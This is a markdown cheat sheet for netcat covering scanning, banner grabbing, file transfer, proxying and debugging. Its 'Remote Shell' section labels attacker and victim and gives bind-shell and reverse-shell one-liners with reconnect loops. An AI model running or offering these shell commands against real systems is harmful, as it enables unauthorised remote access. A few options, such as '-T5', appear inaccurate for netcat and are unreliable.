
## Table of Contents
- [Overview](#overview)
- [Installation](#installation)
- [Basic Usage](#basic-usage)
- [Port Scanning](#port-scanning)
- [File Transfer](#file-transfer)
- [Remote Shell](#remote-shell)
- [Proxy and Redirection](#proxy-and-redirection)
- [Advanced Usage](#advanced-usage)
- [Security Considerations](#security-considerations)
- [Best Practices](#best-practices)

## Overview

Netcat (nc) is a versatile networking utility for reading/writing data across network connections using TCP/UDP protocols. Often called the "Swiss Army knife" of networking tools.

### Key Features
- Port scanning
- Port listening
- File transfer
- Network debugging
- Port forwarding
- Banner grabbing
- Proxy functionality
- Remote shell capabilities

## Installation

### Ubuntu (22.04/24.04)
```bash
# Traditional netcat
sudo apt install netcat-traditional

# OpenBSD netcat
sudo apt install netcat-openbsd
```

### macOS
```bash
# Pre-installed on macOS
# Or install via Homebrew
brew install netcat
```

## Basic Usage

### Connection Testing
```bash
# Basic client connection
nc hostname port

# Listen for connections
nc -l port

# Verbose output
nc -v hostname port

# Very verbose output
nc -vv hostname port
```

### TCP/UDP Connections
```bash
# TCP connection (default)
nc hostname port

# UDP connection
nc -u hostname port

# Force IPv4
nc -4 hostname port

# Force IPv6
nc -6 hostname port
```

## Port Scanning

### Basic Port Scanning
```bash
# Scan single port
nc -zv hostname port

# Scan port range
nc -zv hostname port-range
nc -zv hostname 20-100

# Scan multiple ports
nc -zv hostname 22 80 443
```

### Advanced Scanning
```bash
# TCP scan with timeout
nc -zvw3 hostname port

# UDP scan
nc -zvu hostname port

# Fast scan
nc -zv -T5 hostname port-range
```

### Banner Grabbing
```bash
# Get service banner
echo "" | nc -v hostname port

# Grab HTTP header
echo "HEAD / HTTP/1.0\r\n\r\n" | nc hostname 80

# Extended banner grab
nc -v -w3 hostname port
```

## File Transfer

### Basic File Transfer
```bash
# Receiver
nc -l port > received_file

# Sender
nc hostname port < file_to_send
```

### Directory Transfer
```bash
# Receiver
nc -l port | tar xvf -

# Sender
tar cvf - directory | nc hostname port
```

### With Progress
```bash
# Receiver
nc -l port | pv > received_file

# Sender
pv file_to_send | nc hostname port
```

## Remote Shell

### Basic Shell Access
```bash
# Listener (attacker)
nc -l port -v

# Target (victim)
nc hostname port -e /bin/bash
```

### Reverse Shell
```bash
# Listener
nc -l port -v

# Sender
/bin/bash -i >& /dev/tcp/hostname/port 0>&1
```

### Persistent Connection
```bash
# Listener with reconnect
while true; do nc -l port; done

# Sender with reconnect
while true; do nc hostname port; sleep 1; done
```

## Proxy and Redirection

### Port Forwarding
```bash
# Local port forward
nc -l local_port | nc remote_host remote_port

# With bidirectional communication
mkfifo backpipe
nc -l local_port < backpipe | nc remote_host remote_port > backpipe
```

### Proxy Server
```bash
# Simple proxy
nc -l local_port | tee -a logfile | nc remote_host remote_port

# With logging
nc -l local_port | tee -a logfile | nc remote_host remote_port | tee -a logfile
```

## Advanced Usage

### Custom Protocols
```bash
# HTTP GET request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc web_server 80

# SMTP interaction
nc mail_server 25 << EOF
HELO example.com
QUIT
EOF
```

### Debugging
```bash
# Debug web server
nc -l 80 -v -k

# Debug mail server
nc -l 25 -v

# Monitor connections
nc -l port -v | tee connection.log
```

### Encryption
```bash
# Using with SSL/TLS
nc -v hostname port | openssl s_client -connect hostname:port

# Encrypted file transfer
# Sender
tar czf - files | openssl enc -e -aes256 | nc hostname port

# Receiver
nc -l port | openssl enc -d -aes256 | tar xzf -
```

## Security Considerations

### Access Control
```bash
# Limit connection attempts
nc -l port -w timeout

# Allow only IPv4
nc -4 -l port

# Bind to specific interface
nc -l interface_ip port
```

### Monitoring
```bash
# Log all connections
nc -l port -v 2>&1 | tee connection.log

# Monitor with timestamp
nc -l port -v 2>&1 | while read line; do echo "$(date): $line"; done
```

## Best Practices

### Connection Testing
```bash
# Test with timeout
nc -zv -w3 hostname port

# Verify service
nc -v hostname port < /dev/null

# Check UDP service
nc -zuv hostname port
```

### File Transfer Safety
```bash
# Verify transfer
# Sender
md5sum file_to_send
cat file_to_send | nc hostname port

# Receiver
nc -l port | tee received_file | md5sum
```

## Quick Reference

### Essential Commands
```bash
# Listen mode
nc -l port

# Connect mode
nc hostname port

# Port scan
nc -zv hostname port

# File transfer
nc -l port > file    # Receiver
nc hostname port < file    # Sender
```

### Common Options
```bash
-l    # Listen mode
-v    # Verbose
-w    # Timeout
-z    # Zero I/O mode (scanning)
-u    # UDP mode
-p    # Local port
-e    # Execute program
```

## Example Use Cases

### Web Server Testing
```bash
# Basic HTTP request
echo -e "GET / HTTP/1.0\r\n\r\n" | nc web_server 80

# Extended HTTP testing
cat << EOF | nc web_server 80
GET / HTTP/1.1
Host: web_server
User-Agent: netcat
Connection: close

EOF
```

### Network Debugging
```bash
# Simple chat server
nc -l port    # Server
nc hostname port    # Client

# Port forwarding
nc -l local_port | nc remote_host remote_port
```

---

Remember:
- Always consider security implications
- Use timeouts for connections
- Log important operations
- Test in safe environment first
- Document configurations
- Monitor for abuse

For detailed information, consult the man pages (`man nc`).